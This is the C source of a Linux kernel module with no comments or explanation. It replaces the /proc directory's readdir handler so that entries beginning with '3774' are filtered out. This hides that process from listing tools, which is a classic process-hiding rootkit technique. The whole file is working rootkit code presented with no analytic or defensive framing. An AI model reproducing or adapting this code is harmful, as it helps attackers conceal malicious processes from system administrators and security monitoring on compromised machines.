#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <net/sock.h>

MODULE_LICENSE ("GPL");

#define DIRECTORY_ROOT "/proc"
#define DIRECTORY_HIDE "3774"

typedef int (*readdir_t)(struct file *, void *, filldir_t);

readdir_t orig_proc_readdir = NULL;
filldir_t proc_filldir = NULL;


int new_filldir(void *buf, const char *name, int nlen, loff_t off,
ino_t ino, unsigned x)
{
  if (!strncmp(name, DIRECTORY_HIDE, strlen(DIRECTORY_HIDE)))
    return 0;
  
  return proc_filldir(buf, name, nlen, off, ino, x);
}


int our_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
  int r = 0;

  proc_filldir = filldir;
  r = orig_proc_readdir(fp, buf, new_filldir);
  return r;
}


int patch_vfs(readdir_t *orig_readdir, readdir_t new_readdir)
{
  struct file *filep;

  if ( (filep = filp_open(DIRECTORY_ROOT, O_RDONLY, 0)) == NULL) {
    return -1;
  }

  if (orig_readdir)
    *orig_readdir = filep->f_op->readdir;

  filep->f_op->readdir = new_readdir;
  filp_close(filep, 0);

  return 0;
}


int unpatch_vfs(readdir_t orig_readdir)
{
  struct file *filep;

  if ( (filep = filp_open(DIRECTORY_ROOT, O_RDONLY, 0)) == NULL) {
    return -1;
  }

  filep->f_op->readdir = orig_readdir;
  filp_close(filep, 0);
  return 0;
}


int init_module(void)
{
  patch_vfs(&orig_proc_readdir, our_proc_readdir);
  return 0;
}


void cleanup_module(void)
{
  unpatch_vfs(orig_proc_readdir);
}

